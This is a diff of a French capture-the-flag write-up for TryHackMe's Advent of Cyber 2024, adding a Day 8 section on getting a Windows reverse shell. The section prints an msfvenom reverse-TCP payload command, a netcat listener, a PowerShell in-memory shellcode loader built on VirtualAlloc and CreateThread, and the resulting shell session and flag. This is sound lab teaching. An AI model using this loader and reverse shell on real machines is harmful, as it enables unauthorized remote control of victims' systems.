@@ -21,6 +21,7 @@ Lien vers l'épreuve : <https://tryhackme.com/r/room/adventofcyber2024>
 * [Jour 5 : *SOC-mas XX-what-ee?*](#jour-5--soc-mas-xx-what-ee)
 * [Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas](#jour-6--si-je-ne-peux-pas-trouver-un-gentil-malware-à-utiliser-je-ne-le-ferai-pas)
 * [Jour 7 : *Oh no. I'M SPEAKING IN CLOUDTRAIL!*](#jour-7--oh-no-im-speaking-in-cloudtrail)
+* [Jour 8 : Shellcodes du monde, rassemblement](#jour-8--shellcodes-du-monde-rassemblement)
 
 ## Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?
 
@@ -649,4 +650,131 @@ grep -E '([0-9]{4}\s){3}[0-9]{4}' rds.log | grep -i 'mayor'
 2024-11-28T15:23:02.976Z 2024-11-28T15:23:02.976943Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 865.75)
 2024-11-28T15:23:03.161Z 2024-11-28T15:23:03.161700Z      263 Query	INSERT INTO wareville_bank_transactions (account_number, account_owner, amount) VALUES ('[...expurgé...]', 'Mayor Malware', 409.54)
 [...expurgé pour brièveté...]
+```
+
+## Jour 8 : Shellcodes du monde, rassemblement
+
+![Shellcodes](https://img.shields.io/badge/Shellcodes-453368?logo=tryhackme)
+
+![Jour 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730451713924.svg)
+
+Le but de l'exercice est de créer une charge permettant d'obtenir un {% include dictionary.html word="reverse-shell" %} sur une machine Windows.
+
+Nous aurons besoin de créer la charge en elle-même depuis notre machine d'attaque avec la commande :
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.182.77 LPORT=4444 -f powershell
+```
+
+Puis nous ouvrons le port 4444 en attente de connexion avec {% include dictionary.html word="Netcat" %} sur la machine d'attaque :
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+Ensuite, sur la machine cible, nous lançons un terminal PowerShell et nous commençons par copier le bloc
+
+```powershell
+$VrtAlloc = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class VrtAlloc{
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
+}
+"@
+
+Add-Type $VrtAlloc 
+
+$WaitFor= @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WaitFor{
+ [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
+}
+"@
+
+Add-Type $WaitFor
+
+$CrtThread= @"
+using System;
+using System.Runtime.InteropServices;
+
+public class CrtThread{
+ [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+  
+}
+"@
+Add-Type $CrtThread
+```
+
+Après avoir valider ce premier bloc, nous ajoutons le résultat de la commande `msfvenom` réalisée plus tôt.
+
+Ensuite nous devons ajouter les commandes suivantes **ligne par ligne**
+
+```powershell
+[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
+$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
+[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+```
+
+Nous avons obtenu notre {% include dictionary.html word="reverse-shell" %}
+
+```bash
+rlwrap nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.230.38 49808
+Microsoft Windows [Version 10.0.17763.6293]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\glitch>whoami
+whoami
+aoc\glitch
+```
+
+Nous passons le shell de base (`cmd`) en PowerShell, puis nous navigons vers le flag et nous l'ouvrons :
+
+```powershell
+PS C:\Users\glitch> Get-ChildItem
+
+    Directory: C:\Users\glitch
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-r---        10/3/2024  10:56 PM                3D Objects                                                            
+d-r---        10/3/2024  10:56 PM                Contacts                                                              
+d-r---       12/14/2024   8:54 PM                Desktop                                                               
+d-r---        10/3/2024  10:56 PM                Documents                                                             
+d-r---        10/3/2024  10:56 PM                Downloads                                                             
+d-r---        10/3/2024  10:56 PM                Favorites                                                             
+d-r---        10/3/2024  10:56 PM                Links                                                                 
+d-r---        10/3/2024  10:56 PM                Music                                                                 
+d-r---        10/3/2024  10:56 PM                Pictures                                                              
+d-r---        10/3/2024  10:56 PM                Saved Games                                                           
+d-r---        10/3/2024  10:56 PM                Searches                                                              
+d-r---        10/3/2024  10:56 PM                Videos                                                                
+
+
+PS C:\Users\glitch> Set-Location .\Desktop
+PS C:\Users\glitch\Desktop> Get-ChildItem
+
+    Directory: C:\Users\glitch\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website                                                  
+-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website                                   
+-a----        10/3/2024   2:22 PM             26 flag.txt                                                              
+
+
+PS C:\Users\glitch\Desktop> Get-Content flag.txt
+Get-Content flag.txt
+AOC{[...expurgé...]}
 ```
